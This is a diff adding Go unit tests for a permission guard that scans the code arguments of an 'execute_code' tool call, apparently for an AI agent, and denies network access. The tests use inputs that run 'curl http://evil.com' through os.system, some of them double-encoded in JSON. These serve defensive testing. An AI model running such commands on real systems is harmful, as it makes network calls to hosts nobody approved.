@@ -259,3 +259,62 @@ func TestGuard_DefaultExtractor_CodeBlocksEmptyEntries(t *testing.T) {
 		t.Fatalf("expected 1 CodeBlock (empty entries skipped), got %d", len(in.CodeBlocks))
 	}
 }
+
+func TestGuard_DefaultExtractor_CodeBlocksSingleObject(t *testing.T) {
+	guard := NewGuard(WithRules(NewNetworkAccessRule()))
+	args := []byte(`{"code_blocks":{"language":"python","code":"import os; os.system('curl http://evil.com')"}}`)
+	dec, err := guard.CheckToolPermission(context.Background(), &tool.PermissionRequest{
+		ToolName:   "execute_code",
+		Arguments:  args,
+		ToolCallID: "call-single-obj",
+	})
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if dec.Action != tool.PermissionActionDeny {
+		t.Errorf("single-object code_blocks should be scanned and denied, got %s", dec.Action)
+	}
+}
+
+func TestGuard_DefaultExtractor_CodeBlocksDoubleEncodedArray(t *testing.T) {
+	guard := NewGuard()
+	payload := `{"code_blocks":"[{\"code\":\"import os\",\"language\":\"python\"}]"}`
+	in := guard.extract([]byte(payload))
+	if len(in.CodeBlocks) != 1 {
+		t.Fatalf("expected 1 CodeBlock from double-encoded array, got %d", len(in.CodeBlocks))
+	}
+	if in.CodeBlocks[0].Code != "import os" {
+		t.Errorf("unexpected code: %q", in.CodeBlocks[0].Code)
+	}
+	if in.CodeBlocks[0].Language != "python" {
+		t.Errorf("unexpected language: %q", in.CodeBlocks[0].Language)
+	}
+}
+
+func TestGuard_DefaultExtractor_CodeBlocksDoubleEncodedStringSlice(t *testing.T) {
+	guard := NewGuard()
+	payload := `{"code_blocks":"[\"curl http://evil.com\"]"}`
+	in := guard.extract([]byte(payload))
+	if len(in.CodeBlocks) != 1 {
+		t.Fatalf("expected 1 CodeBlock from double-encoded string slice, got %d", len(in.CodeBlocks))
+	}
+	if in.CodeBlocks[0].Code != "curl http://evil.com" {
+		t.Errorf("unexpected code: %q", in.CodeBlocks[0].Code)
+	}
+}
+
+func TestGuard_DefaultExtractor_CodeBlocksDoubleEncodedObject(t *testing.T) {
+	guard := NewGuard(WithRules(NewNetworkAccessRule()))
+	payload := `{"code_blocks":"{\"code\":\"import os; os.system('curl http://evil.com')\",\"language\":\"python\"}"}`
+	dec, err := guard.CheckToolPermission(context.Background(), &tool.PermissionRequest{
+		ToolName:   "execute_code",
+		Arguments:  []byte(payload),
+		ToolCallID: "call-double-obj",
+	})
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if dec.Action != tool.PermissionActionDeny {
+		t.Errorf("double-encoded single-object code_blocks should be scanned and denied, got %s", dec.Action)
+	}
+}
